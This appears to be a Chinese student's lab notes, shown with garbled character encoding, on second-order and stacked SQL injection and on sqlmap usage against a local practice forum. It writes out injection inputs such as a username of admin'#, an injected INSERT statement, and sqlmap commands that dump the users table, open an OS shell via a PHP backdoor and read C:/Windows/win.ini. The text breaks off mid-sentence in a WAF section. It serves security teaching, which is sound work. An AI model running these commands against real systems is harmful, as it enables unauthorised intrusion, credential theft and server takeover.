.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">äºŒæ¬¡ç›²æ³¨</h2>
<p>â¼†æ¬¡æ³¨â¼Šæ˜¯æŒ‡å·²å­˜å‚¨ï¼ˆæ•°æ®åº“ã€â½‚ä»¶ï¼‰çš„â½¤æˆ·è¾“â¼Šè¢«è¯»å–åï¼Œå†æ¬¡è¿›â¼Šåˆ°SQLæŸ¥è¯¢è¯­å¥ä¸­å¯¼è‡´
çš„æ³¨â¼Š</p>
<p>å‡ ä¹æ‰€æœ‰ä»»ä½•ç½‘ç«™åå°éƒ½æœ‰ä¸€ä¸ªç”¨æˆ·å«admin å¯†ç 123456
å…ˆæ³¨å†Œä¸€ä¸ªæ–°çš„ç”¨æˆ·</p>
<p>admin-123456</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54bec814d16546b29e9c423808189ab7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=vBGveRtZJd90p1%2FlsWh%2B129FZvg%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba55b9d6386642c0b3257412fd3f3609~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0%2Fucg14ULSQ35aQv4vSeY8kC1kk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">ç¢°æ’ç”¨æˆ·è´¦æˆ·</h3>
<p>-åˆºæ¢æˆåŠŸ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25a67260e418421eb414f26b6754b612~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=gxaaoXjjYHhKcjfpoRB0VV%2Bg3ng%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘è‡ªå·±å»æ³¨å†Œä¸€ä¸ª admin'#</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cafcaa564d7345f6be2b0654962881c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=x0LCDvEBamlRgdBBIwBcwcs7IUg%3D" alt="image.png" loading="lazy"/></p>
<p>ç™»å½•admin'#ï¼Œç„¶åä¿®æ”¹å¯†ç --è®°ä¸€ä¸‹æ”¹åçš„æ˜¯456789</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e8048d316124b0eb494e88ab6a1a5e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=AA8yhXGtjD%2FJo4WdlXobzustqAo%3D" alt="image.png" loading="lazy"/>
-<strong>è¿™æ˜¯ä¹‹å‰</strong>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07bda3d2d1374ebb9a81a30f400f7972~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Z8C298MFYCi2pSepfGkKSyuzFmw%3D" alt="image.png" loading="lazy"/>
<strong>åˆ·æ–°åï¼Œæ”¹å˜çš„æ˜¯adminçš„å¯†ç ï¼Œadmin'#æ²¡æœ‰å˜</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db98c4a871bc463b93e1fc469dcd7585~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=I2iFuG3c3T44ksNb0h5WGtimKKI%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">æŸ¥çœ‹åŸå› </h3>
<p>æºç  \bbs\member\updatePwd.php</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8986ccb5057b4f809ad11bb78a8e8ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=M87Uyv3cUivuDOfWYXE0%2FYempaw%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">update <span class="hljs-built_in">users</span> <span class="hljs-built_in">set</span> password=md5(<span class="hljs-string">'123456'</span>)wherename=<span class="hljs-string">'admin'</span><span class="hljs-comment">#'</span>
</code></pre>
<p>ç®€å•æ¥è¯´å°±æ˜¯sqlçš„æ•°æ®åº“è¯­æ³• æ³¨é‡Šæ‰åé¢çš„å†…å®¹
æ¯”å¦‚# è¿˜æœ‰ä¸€ä¸ª--ä¹Ÿæ˜¯</p>
<h2 data-id="heading-3">å †å æ³¨å…¥</h2>
<p>åœ¨SQLæ•°æ®åº“ä¸­ï¼Œæ¯æ¡è¯­å¥æ˜¯ä»¥;åˆ†å¼€çš„ï¼Œå †å æ³¨â¼Šå°±æ˜¯â¼€æ¬¡æ€§æ³¨â¼Šå¹¶æ‰§â¾å¤šæ¡è¯­å¥ï¼ˆå¤šè¯­å¥ä¹‹é—´ä»¥åˆ†å·
éš”å¼€ï¼‰çš„æ³¨â¼Šâ½…å¼ã€‚ï¼ˆæ•…äº‹ï¼šåœ°é“å‡ºç«™å¥—ç¥¨â¼€æ¬¡æ€§è¿›ä¸¤ä¸ªâ¼ˆï¼‰</p>
<p>unionè”åˆæŸ¥è¯¢æ³¨â¼Šæ‰§â¾çš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥â½¤æ¥æ‰§â¾æŸ¥è¯¢è¯­å¥ã€‚å †å æ³¨â¼Šå¯ä»¥æ‰§â¾çš„æ˜¯ä»»æ„çš„è¯­å¥ï¼Œå¦‚å¢åˆ æ”¹ç­‰</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf355f34d860443eb2095928491c83b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0rST55thdd7iAkhEpCLJ2uW1e3U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85d78c5c6717401882f025d9f995a318~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=clJYRtBEkR3OkO03BcwUnVyn6fc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aba0b0c970da4fa7897dde1c8a5658cf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=TJ8lvpbhCBzSEVOLzpkH4cRB4us%3D" alt="image.png" loading="lazy"/>
è¦å †å ï¼ŒçŸ¥é“é‚£ä¸ªè¡¨ç»“æ„ç”¨å‰é¢çŸ¥è¯†ç‚¹è·å–è¡¨åå­—æ®µå</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40ccb0bd8225472d9ccdec03e8ce5490~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=0gwKcQE%2FCun3YZk1nnSJTGTrik4%3D" alt="image.png" loading="lazy"/>
ç„¶å</p>
<pre><code class="hljs language-sql" lang="sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (name,password) <span class="hljs-keyword">values</span>(<span class="hljs-string">'ddd'</span>,md5(<span class="hljs-string">'ddd'</span>));
</code></pre>
<p>å †å ä¸æ­¢ insert è¿˜æœ‰delete è¿˜æœ‰update</p>
<h2 data-id="heading-4">SQLMap</h2>
<p>sqlmapæ˜¯â¼€ä¸ªå¼€æºçš„æ¸—é€æµ‹è¯•â¼¯å…·ï¼Œå®ƒå¯ä»¥â¾ƒåŠ¨åŒ–æ£€æµ‹å’Œåˆ©â½¤SQLæ³¨â¼Šæ¼æ´å¹¶æ¥ç®¡æ•°æ®åº“æœåŠ¡å™¨ã€‚å®ƒæœ‰
â¼€ä¸ªå¼ºâ¼¤çš„æ£€æµ‹å¼•æ“ï¼Œè®¸å¤šé€‚åˆäºç»ˆææ¸—é€æµ‹è¯•çš„è‰¯å¥½ç‰¹æ€§å’Œä¼—å¤šçš„æ“ä½œé€‰é¡¹
å¦‚æœå¹³æ—¶è¦æ¢æµ‹bbsè¿™ä¸ªç½‘ç«™ è¿™ä¸å¾—çœ‹çœ‹è‡ªå·±ç‰©ç†æœºip</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbcfc36bd76a435eb7ce6d0c27c2bfd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=6%2FJqsRxx5RlGBu5QgQK9IuJtOlE%3D" alt="image.png" loading="lazy"/>
##SQLMapæ£€æµ‹æ¼æ´--æ¢æµ‹ç›®æ ‡ç½‘ç«™æœ‰æ²¡æœ‰sqlæ³¨å…¥æ¼æ´</p>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1'
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3490361b55924dd782463b45e84ac2a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=132NKfK2nCE2ntcGgAENm9IhnuA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b432202309f844619bc6513846ca5ff4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Ma0RjjQEP1BpQDF5JOUyRxgUlhs%3D" alt="image.png" loading="lazy"/>
æœ‰è¿™äº›ä¸œè¥¿ å°±ä»£è¡¨ç€è¿™äº›ä¸œè¥¿æ¼æ´éƒ½æ˜¯å­˜åœ¨çš„--PHPå…·ä½“ç‰ˆæœ¬ Apache</p>
<h3 data-id="heading-5">æŸ¥è¯¢bbsç½‘ç«™å½“å‰æ•°æ®åº“ï¼›<strong>å½“å‰æ•°æ®åº“</strong><code>--current-db</code></h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' --current-db
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf7482d9d3de4ce580de89476fd077ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=UMWS8cWuuAPNIVQCPtLa%2FUQK4Zw%3D" alt="image.png" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f74f4b70e99547ccb08d91149e0cf8f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=c8K8x0CtAtgqSEh%2Fl%2BQzNgvlYM8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">æŸ¥çœ‹bbsç½‘ç«™çš„åº“æœ‰å“ªäº›è¡¨</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.220.1/bbs/showmessage.php?id=1' -D jrlt --tables
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6694aa4568f14acea7d9bc1a1e70f919~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=DmLBOq1PksppI2LKxi2vHvhCn50%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">å½“å‰è¡¨æœ‰å“ªäº›å­—æ®µ åˆ—</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' -D jrlt -T users --columns
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a58b25e2ff7c49c5adeda9acce5ac604~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=y0WycwJjOGFkpo94%2BpmHt5R%2F5WU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">åˆ—å‡ºå†…å®¹</h3>
<pre><code class="hljs language-kali" lang="kali">sqlmap -u 'http://192.168.20.1/bbs/showmessage.php?id=1' -D jrlt -T users -C password --dump#å¡ä½çš„è¯ä¸åœçš„æ•²å›â»‹è¾“â¼Šy
</code></pre>
<p>è¿‡ç¨‹å°±æ˜¯yåˆ°åº•ï¼Œæœ‰ä¸€ä¸ªé€‰æ‹©å­—å…¸ï¼Œç›´æ¥å›è½¦å°±è¡Œï¼Œç„¶ååœ¨åŠªåŠ›å“ˆå¸Œç ´è§£</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b986ba4ecd1c4ef69eeade2e747dc2ad~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=smSUFPFYXnAlSBUVYUquNWSLYy8%3D" alt="image.png" loading="lazy"/>
å’Œè€å¸ˆçš„ä¸å¤ªä¸€æ · ä½†æ˜¯ æ— æ‰€è°“äº†å…ˆ
å¾—åˆ°é‚£äº›å¯†ç </p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaa042ac52df4430ad4df8ed1f3380e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=i%2FTcqaVGjeVu5Pib8EPW8GZsMYI%3D" alt="image.png" loading="lazy"/>
å¯ä»¥åæœŸè‡ªå·±å“ˆå¸Œè§£å»
ç¬¬ä¸‰ä¸ªè§£çš„å¾ˆæ…¢æ˜¯å› ä¸ºæˆ‘å‰é¢ åšå †å çš„æ—¶å€™æ”¹äº†adminçš„å¯†ç 456789</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8d53612ef0240189d509f666369eb57~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=ajmFnKqExAaH6lnFrSs4JT09FAo%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8fc367509d954c41869c6b5d5444d18a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=y946eGU4iCfeNEYfqygdWYBvRjA%3D" alt="image.png" loading="lazy"/></p>
<p>è€å¸ˆçš„å°±é•¿è¿™æ ·</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4246721a8fd4a04bf4bd402f236d33d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=JwBmx3ttf2Rx2u%2Fgs9ar2bVF7LY%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-9">æ‰©å±•æ“ä½œ</h3>
<pre><code class="hljs language-lua" lang="lua">
sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--sql-shell</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ff4d1e26fd348a49a1e0455f2362716~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=TbXTANny3QKZS3Mtl0qYm0fWa%2BQ%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36ea5ceaf7f14a30a0ac24e075b67e8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Ziv%2Bw7aZs26MWcihBSE0oLZY0JA%3D" alt="image.png" loading="lazy"/></p>
<p>é€€å‡ºè¯­å¥</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc9d9953bdf44e5c8d43ecaa21342572~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=ThCDyRKt%2BF2ZAaoO30ZIfFhBsIM%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-10">å¯†ç çˆ†ç ´</h4>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--password</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/495765981755482c86b53d3f7adfc147~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=q9CjnjZeAh%2FkOEqCKP68yHDDqQM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5be81abfc02e4526a99978bacd6787d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=Kk1eJtfZcfMc%2BvrDe3vvyW1sxzQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-11">ç³»ç»Ÿå‘½ä»¤</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e1b93d01d8b497aa2d9dd5713b26de3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=xwMTbZsAVniXQZmIEFXcdcLwwuk%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">'http://192.168.20.1/bbs/showmessage.php?id=1'</span> <span class="hljs-comment">--os-shell</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9129f1f11d194f95bf6dc21dbe701469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=c%2FZLbwduJ2yISahGuougyCaiOhk%3D" alt="image.png" loading="lazy"/>
è¯¥é¶æœºçš„ web åº”ç”¨æŠ€æœ¯æ˜¯<strong>PHP 5.4.45</strong>ï¼Œé€‰æ‹©ä¸å½“å‰ web è¯­è¨€åŒ¹é…çš„ â€œPHPâ€ é€‰é¡¹ï¼Œæ‰èƒ½æˆåŠŸåˆ›å»º web åé—¨å¹¶è·å–æ“ä½œç³»ç»Ÿå‘½ä»¤è¡Œ shellã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fdec4c6d497542028e5cdce055701bc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=kFVlJnFPfzyck6PTwM2tv9up2zI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">æ–‡ä»¶è¯»å–</h4>
<p>å‡ºäº†é—®é¢˜</p>
<p>æˆåŠŸç‰ˆæœ¬ğŸ‘‡æˆ‘æŠŠè¿™ä¸ªæ–‡ä»¶åç§°æ”¹äº†ä¸€ä¸‹å°±è¡Œäº†ï¼Œç–‘ä¼¼ç¬¬ä¸€æ¬¡åˆ›çš„æ—¶å€™å¸¦å…¥äº†å¥‡æ€ªå­—ç¬¦æˆ–è€…ç”µè„‘ç¼“å­˜æ²¡åˆ°ä½</p>
<pre><code class="hljs language-arduino" lang="arduino">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"E:/e.txt"</span>
</code></pre>
<p>ä¸­é—´åšçš„åŠªåŠ›æœ‰</p>
<p>å…ˆæ‰§è¡ŒåŸºç¡€æ³¨å…¥å‘½ä»¤ï¼Œç¡®è®¤<code>id</code>å‚æ•°ç¡®å®å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ï¼Œé¿å…åœ¨æ— æ•ˆæ³¨å…¥ç‚¹ä¸Šå°è¯•é«˜æƒé™æ“ä½œ</p>
<pre><code class="hljs language-lua" lang="lua">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> <span class="hljs-comment">--dbs</span>
</code></pre>
<p>ç„¶åå¾—å‡º</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0bec1daad32a4fb69aba0cc0ec5cad24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=As1cFD%2FT48LcjGYgtuOC7SGjBMQ%3D" alt="image.png" loading="lazy"/>
æ·»åŠ <code>-v 3</code>å‚æ•°ï¼ˆè¯¦ç»†è¾“å‡ºæ‰§è¡Œè¿‡ç¨‹ï¼‰ï¼Œsqlmap ä¼šæ˜¾ç¤ºæ–‡ä»¶è¯»å–è¿‡ç¨‹ä¸­çš„å…·ä½“é”™è¯¯ï¼ˆå¦‚ã€Œæƒé™ä¸è¶³ã€ã€Œè·¯å¾„è¢«ç¦æ­¢ã€ï¼‰ï¼Œæ–¹ä¾¿å®šä½é—®é¢˜</p>
<pre><code class="hljs language-arduino" lang="arduino">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"E:/e.txt"</span> -v <span class="hljs-number">3</span>
</code></pre>
<p>å¾—å‡º</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a68c00b240d4e1699ce8742a67136f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=WBaHmEKlQjfDVKeTGdjnj5RYEyE%3D" alt="image.png" loading="lazy"/></p>
<p>æ”¾å¼ƒè‡ªå®šä¹‰çš„<code>e.txt</code>ï¼Œå…ˆå°è¯•è¯»å–é¶æœºç³»ç»Ÿé»˜è®¤å­˜åœ¨ã€ä¸”æƒé™å®½æ¾çš„æ–‡ä»¶ï¼ŒéªŒè¯æ–‡ä»¶è¯»å–åŠŸèƒ½æ˜¯å¦å¯ç”¨ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">sqlmap -u <span class="hljs-string">"http://192.168.20.1/bbs/showmessage.php?id=1"</span> --file-read <span class="hljs-string">"C:/Windows/win.ini"</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4b6ccbeac0845e990b29b6e3b475987~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=LNH57qIkpD6%2BErI%2FKphsavIERfc%3D" alt="image.png" loading="lazy"/>
<strong>æ–‡ä»¶è¯»å–åŠŸèƒ½æœ¬èº«æ˜¯æ­£å¸¸çš„ï¼ˆå› ä¸ºæˆåŠŸè¯»åˆ°äº†<code>C:/Windows/win.ini</code>ï¼‰ï¼Œé—®é¢˜åªå‡ºåœ¨ã€Œé¶æœºä¸Šçš„<code>E:/e.txt</code>å®é™…ä¸å­˜åœ¨ / è·¯å¾„é”™è¯¯ã€</strong></p>
<p>å…·ä½“åˆ†æå¦‚ä¸‹ï¼š
èƒ½æˆåŠŸè¯»å–é¶æœºçš„<code>C:/Windows/win.ini</code>ï¼Œè¯´æ˜ï¼š</p>
<ul>
<li>æ•°æ®åº“ç”¨æˆ·æœ‰<code>FILE</code>æƒé™</li>
<li><code>secure_file_priv</code>é…ç½®æ— é™åˆ¶</li>
<li>æ“ä½œç³»ç»Ÿå±‚é¢çš„æ–‡ä»¶è¯»å–æƒé™æ­£å¸¸
æ‰€ä»¥æ”¹äº†ä¸ªåå­—æˆåŠŸäº†</li>
</ul>
<p>å›å½’ä¸»é¢˜</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d9922ed4e9a4632b9e650aaff777901~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=OzWzDiDRFcQpSV0dPVHm8SqU1Zo%3D" alt="image.png" loading="lazy"/>
è¿”å›è®©æˆ‘è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„å†…å®¹</p>
<p>'/root/.local/share/sqlmap/output/192.168.20.1/files/E__test.txt'</p>
<p>æ–‡ä»¶è·¯å¾„æœ‰äº†</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> <span class="hljs-string">'/root/.local/share/sqlmap/output/192.168.20.1/files/E__test.txt'</span> 
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a650c3500c0438b903e76c820453fac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRXk0NDM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077340&amp;x-signature=sMA8IL6jCe9YM%2Fh0YXAhMtUQY8c%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-13">WAFå®‰å…¨ç‹—</h2>
<p>ä¸è¦å†ç‰©ç†æœºä¸Šè£…å®‰å…¨ç‹—ï¼Œä¼šæ‹–å®phpï¼Œ
